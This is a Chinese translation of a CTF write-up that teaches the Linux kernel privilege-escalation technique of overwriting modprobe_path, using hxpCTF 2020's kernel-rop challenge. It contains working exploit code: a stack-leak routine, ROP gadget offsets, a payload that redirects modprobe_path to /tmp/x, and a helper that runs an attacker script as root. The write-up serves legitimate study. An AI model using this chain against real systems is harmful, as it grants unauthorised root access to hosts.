> 原文链接: https://www.anquanke.com//post/id/232545 


# Linux内核漏洞利用技术：覆写modprobe_path


                                阅读量   
                                **140224**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者lkmidas，文章来源：lkmidas.github.io
                                <br>原文地址：[https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01dfa596b3abbda891.jpg)](https://p5.ssl.qhimg.com/t01dfa596b3abbda891.jpg)



## 0x00 前言

如果大家阅读过我此前发表的Linux内核漏洞利用的相关文章，可能会知道我们最近一直在学习这块内容。在过去的几周里，我的团队参加了DiceCTF和UnionCTF比赛，其中都包括了Linux内核PWN题目。凭借我有限的知识，在比赛过程中没有解出这类题目。但是通过阅读其他优秀CTF团队和成员的文章，我发现他们很多人都在使用一种相似的技术，这样一来在使用Payload时就完全不需要经历调用`prepare_kernel_cred()`和`commit_creds()`的这个痛苦过程。该技术是通过覆盖内核中的`modprobe_path`来实现的。这项技术对我来说是全新的，因此我在网上进行了一些调研，并尝试进行实验。事实证明，这种技术非常流行，并且易于使用，由此我终于明白了为什么很多人都会倾向于使用这种方法，而不再使用传统方法。

不过，在我的研究过程中，没有看到能够清晰解释该技术的文章，因此我决定写这篇文章来做详细分析。这个技术本身一点都不复杂，我甚至可以说，它比我之前文章所展现的技术要简单得多。为了在本文中进行演示，我会使用hxpCTF 2020的kernel-rop挑战作为示例，我发现这个题目非常适合用于演示。

希望这篇文章可以帮助大家了解这种漏洞利用的技术原理。



## 0x01 题目说明

因为我希望这篇文章能与我之前的系列文章区分开，因此我在这里再对kernel-rop挑战的题目进行说明。如果大家已经了解这道题目，可以跳过这一小节。

简而言之，在这道题目中给我们提供了以下文件：

（1）vmlinuz – 压缩后的Linux内核；<br>
（2）initramfs.cpio.gz – Linux文件系统，其中包含了存在漏洞的内核模块调用`hackme.ko`；<br>
（3）run.sh – 包含qemu运行命令的Shell脚本。

而这些是我们可以从这些文件中得到的信息：

（1）系统有完善的保护措施，包括SMEP、SMAP、KPTI和KASLR；<br>
（2）Linux内核使用了FG-KASLR，这是KASLR的一个分支版本，它通过随机化每个函数的地址来增加额外的保护层，而不仅仅是保护内核基址；<br>
（3）存在漏洞的模块在`hackme_init()`中注册了一个名为hackme的设备，我们可以打开它，并对其进行读写操作；<br>
（4）hackme_read()和hackme_write()函数存在栈缓冲区溢出漏洞，我们可以在内核栈上几乎无限地读写。

```
ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
`{`   
    //...
    int tmp[32];
    //...
    if ( _size &gt; 0x1000 )
    `{`
        _warn_printk("Buffer overflow detected (%d &lt; %lu)!\n", 4096LL, _size);
        BUG();
    `}`
    _check_object_size(hackme_buf, _size, 0LL);
    if ( copy_from_user(hackme_buf, data, v5) )
        return -14LL;
    _memcpy(tmp, hackme_buf);
    //...
`}`

ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
`{`   
    //...
    int tmp[32];
    //...
    _memcpy(hackme_buf, tmp);
    if ( _size &gt; 0x1000 )
    `{`
        _warn_printk("Buffer overflow detected (%d &lt; %lu)!\n", 4096LL, _size);
        BUG();
    `}`
    _check_object_size(hackme_buf, _size, 1LL);
    v6 = copy_to_user(data, hackme_buf, _size) == 0;
    //...
`}`
```

以上就是我们介绍的CTF挑战题目和环境，非常简单也非常典型。接下来，我们进入到最重要的部分，解释漏洞利用技术。

说明：在我之前的系列文章中，我演示了作者使用的一个漏洞利用方法，使用四个阶段的Payload来调用`commit_creds(prepare_kernel_cred(0))`。如果大家有兴趣，可以前往阅读。



## 0x02 覆写modprobe_path技术

首先，什么是modprobe？根据维基百科的说法，modprobe是最初由Rusty Russell编写的Linux程序，用于在Linux内核中添加可加载的内核模块。实际上，当我们在Linux内核中安装或卸载新模块时，就会执行这个程序。它的路径是一个内核全局变量，默认为`/sbin/modprobe`，我们可以通过运行以下命令来检查它：

```
cat /proc/sys/kernel/modprobe
-&gt; /sbin/modprobe
```

到目前为止，我们可能还会有疑问，为什么这个程序可以被用于内核漏洞利用？答案在于以下两个原因：

首先，modprobe的路径（默认情况下为`/sbin/modprobe`）存储在内核本身的`modprobe_path`符号以及可写页面中。我们可以通过读取`/proc/kallsyms`来获取其地址（由于KASLR机制，因此这个地址各不相同）：

```
cat /proc/kallsyms | grep modprobe_path
-&gt; ffffffffa7a61820 D modprobe_path
```

其次，当我们执行具有未知文件类型的文件时，将执行存储在modprobe_path路径的程序。更准确地说，如果我们针对系统未知文件签名（魔术头）的文件调用execve()，则会产生以下调用，最终调用到modprobe：

（1）do_execve()<br>
（2）do_execveat_common()<br>
（3）bprm_execve()<br>
（4）exec_binprm()<br>
（5）search_binary_handler()<br>
（6）request_module()<br>
（7）call_modprobe()

所有这些调用最终都将执行以下操作：

```
static int call_modprobe(char *module_name, int wait)
`{`
    ...
      argv[0] = modprobe_path;
      argv[1] = "-q";
      argv[2] = "--";
      argv[3] = module_name;
      argv[4] = NULL;

      info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
                     NULL, free_modprobe_argv, NULL);
    ...
`}`
```

简而言之，当我们在系统上执行文件类型未知的文件时，系统将会执行当前路径存储在modprobe_path中的任何文件。因此，我们所研究的技术就是使用任意写入原语，将modprobe_path覆盖到我们自己编写的Shell脚本的路径中，然后执行具有未知文件签名的虚拟文件。其结果将导致在系统仍处于内核模式时执行Shell脚本，从而导致root特权的任意代码执行。

要查看该技术的实际案例，我们可以为kernel-rop编写一个Payload。



## 0x03 Payload

### <a class="reference-link" name="3.1%20%E6%94%B6%E9%9B%86%E5%B0%8F%E5%B7%A5%E5%85%B7%E5%92%8C%E5%9C%B0%E5%9D%80"></a>3.1 收集小工具和地址

该技术的前提条件如下：

（1）知道`modprobe_path`的地址；<br>
（2）知道`kpti_trampoline`的地址，以便在覆写`modprobe_path`之后干净地返回到用户空间；<br>
（3）有任意写入原语。

针对我们要挑战的这道题目，在栈缓冲区溢出的场景中，这三个前提条件实际上只能满足一个，也就是我们仅仅知道内核映像基址，其原因在于：

（1）`modprobe_path`和`kpti_trampoline`都没有受到FG-KASLR的影响，因此它们的地址和内核映像基址之间的偏移量是恒定的。<br>
（2）对于任意写入，我们可以使用这三个小工具，它们位于内核开头的区域，不会受到FG-KASLR的影响：

```
unsigned long pop_rax_ret = image_base + 0x4d11UL; // pop rax; ret;
unsigned long pop_rbx_r12_rbp_ret = image_base + 0x3190UL; // pop rbx ; pop r12 ; pop rbp ; ret;
unsigned long write_ptr_rbx_rax_pop2_ret = image_base + 0x306dUL; // mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;
```

我们泄漏内核映像基址，可以使用`hackme_read()`操作来计算这些地址：

```
void leak(void)`{`
    unsigned n = 40;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];
    image_base = leak[38] - 0xa157ULL;
    kpti_trampoline = image_base + 0x200f10UL + 22UL;
    pop_rax_ret = image_base + 0x4d11UL;
    pop_rbx_r12_rbp_ret = image_base + 0x3190UL;
    write_ptr_rbx_rax_pop2_ret = image_base + 0x306dUL;
    modprobe_path = image_base + 0x1061820UL;

    printf("[*] Leaked %zd bytes\n", r);
    printf("    --&gt; Cookie: %lx\n", cookie);
    printf("    --&gt; Image base: %lx\n", image_base);
`}`
```

### <a class="reference-link" name="3.2%20%E8%A6%86%E5%86%99modprobe_path"></a>3.2 覆写modprobe_path

在泄漏后，现在的目标是将`modprobe_path`覆盖为我们可以控制的文件的路径。在大多数Linux系统中，我们可以以任意用户的身份自由地读写`/tmp`目录，因此我将使用上述三个小工具将`modprobe_path`覆盖到名为`/tmp/x`的文件中，然后在经过`kpti_trampoline`后，安全地返回到用户空间中的函数`get_flag()`。

```
void overflow(void)`{`
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rax_ret; // return address
    payload[off++] = 0x782f706d742f; // rax &lt;- "/tmp/x"
    payload[off++] = pop_rbx_r12_rbp_ret;
    payload[off++] = modprobe_path; // rbx &lt;- modprobe_path
    payload[off++] = 0x0; // dummy r12
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = write_ptr_rbx_rax_pop2_ret; // modprobe_path &lt;- "/tmp/x"
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_flag;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to overwrite modprobe_path");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
`}`
```

### <a class="reference-link" name="3.3%20%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E8%84%9A%E6%9C%AC"></a>3.3 执行任意脚本

既然`modprobe_path`指向`/tmp/x`，我们要做的就是编写其内容，该内容将以root特权执行。在这种情况下，我们只需要编写一个简单的Shell脚本，将该标志从`/dev/sda`复制到`/tmp`目录中，并使其对所有用户可读。脚本如下：

```
#!/bin/sh
cp /dev/sda /tmp/flag
chmod 777 /tmp/flag
```

之后，我编写了一个仅包含`\xtf`字节的虚拟文件，以使其成为系统的未知文件，然后执行它。在执行完成后，我们应该在`/tmp`中可以看到一个可以读取的flag文件：

```
void get_flag(void)`{`
    puts("[*] Returned to userland, setting up for fake modprobe");

    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' &gt; /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");

    exit(0);
`}`
```

如果一切顺利，应该就可以打印这个flag。



## 0x04 总结

至此，我想我们都理解了为什么PWN大神们如此喜爱这种技术。当我在充分理解后编写漏洞利用程序时，我感到非常惊讶，因为它不仅非常易于理解和使用，而且前提条件非常少，在这两点上都具有优势。因此，我立刻就完成了这篇文章，希望能对大家有所帮助。



## 0x05 附录

完整漏洞利用代码请参考：[https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/modprobe.c](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/modprobe.c) 。
